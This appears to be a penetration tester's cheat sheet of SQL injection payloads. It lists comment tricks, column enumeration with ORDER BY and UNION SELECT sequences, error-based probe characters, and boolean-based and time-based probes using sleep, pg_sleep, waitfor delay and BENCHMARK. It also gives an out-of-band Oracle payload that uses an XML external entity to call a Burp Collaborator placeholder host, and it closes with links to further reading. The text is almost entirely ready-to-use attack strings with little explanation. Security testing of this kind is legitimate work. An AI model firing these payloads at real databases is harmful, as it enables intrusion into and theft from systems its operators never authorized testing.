<h1>SQL injection detection</h1>

# IN BAND (Classic)
###########################################################################################################

# UNION BASED

"--" Symbol Alternative
```
— 	Inline comment
#	Inline comment
/* 	Block comment
*/ 	Block comment
```
Column enumeration 

======================================================================================================================================================================
Method 1
```
ORDER BY 1 --+
ORDER BY 2 --+
ORDER BY 3 --+
ORDER BY 4 --+
ORDER BY 5 --+
ORDER BY 6 --+
ORDER BY 7 --+
ORDER BY 8 --+
ORDER BY 9 --+
ORDER BY 10 --+
ORDER BY 11 --+
.....
```

=======================================================================================================================================================================
 ORDER BY 1 --+   
 Alternative :  ' ORDER BY 1 --+ ; " ORDER BY 1 --+ ;

Method 2

```
UNION SELECT NULL --+
UNION SELECT NULL,NULL --+
UNION SELECT NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
...
```
==================================================================================================================

Method 3

```
UNION SELECT 1 --+
UNION SELECT 1,2 --+
UNION SELECT 1,2,3 --+
UNION SELECT 1,2,3,4 --+
UNION SELECT 1,2,3,4,5 --+
UNION SELECT 1,2,3,4,5,6 --+
UNION SELECT 1,2,3,4,5,6,7 --+
UNION SELECT 1,2,3,4,5,6,7,8 --+
UNION SELECT 1,2,3,4,5,6,7,8,9 --+
UNION SELECT 1,2,3,4,5,6,7,8,9,10 --+
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --+ ..........................................................................
..........
```

==========================================================================================================================

ERROR BASED

``` '
''
`
``
,
"
""
/
//
\
\\
;
...
```
BOOLEAN BASED
```
1 AND 1
2 OR 3
2-1
2^1
3*1
%15
1=2
1>2
3
.....
```
TİME BASED
```
sleep(5)
pg_sleep(5)
waitfor delay '0:0:5'
BENCHMARK(10000000,rand())
....
```
OUT-OF-BAND
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
```
Other Resources:
https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf
https://www.pwc.com.tr/tr/assets/pdf/out-of-band-oob-sql-injection.pdf
https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwj-ir6t7bCCAxX_FRAIHVEdCXU4ChAWegQIBRAB&url=https%3A%2F%2Fzenodo.org%2Frecord%2F3556347%2Ffiles%2FA%2520Study%2520of%2520Out-of-Band%2520SQL%2520Injection.pdf%3Fdownload%3D1&usg=AOvVaw0hGkiklfL04cE-qOCuEaPa&opi=89978449
https://www.w3schools.com/sql/sql_comments.asp
